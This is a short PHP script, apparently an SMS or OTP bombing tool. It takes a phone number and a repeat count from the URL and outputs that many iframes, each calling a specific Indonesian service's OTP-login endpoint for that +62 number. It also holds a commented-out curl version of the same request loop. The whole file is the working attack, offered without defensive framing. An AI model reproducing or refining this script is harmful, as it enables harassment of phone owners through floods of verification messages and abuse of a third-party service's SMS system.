<?php

$nomer = $_GET["no"];
$loop = $_GET["loop"];
$x = 0;

/*function http_mona(){
    // persiapkan curl
    $ch = curl_init(); 

    // set url 
    curl_setopt($ch, CURLOPT_URL, "http://web.pomona.id/otp/login/+62/" + $nomer);

    // return the transfer as a string 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 

    // $output contains the output string 
    $output = curl_exec($ch); 

    // mengembalikan hasil curl
    echo $output;
}*/

while($x < $loop) {
    echo "<iframe src='http://web.pomona.id/otp/login/+62/".$nomer."' width='100'></iframe>";
    //print_r(get_headers($url));
    //http_mona();
    //print_r(get_headers($url, 1));
    //var_dump(get_headers($url));
    $x++;

}
    echo "Sukses dung";
   
?>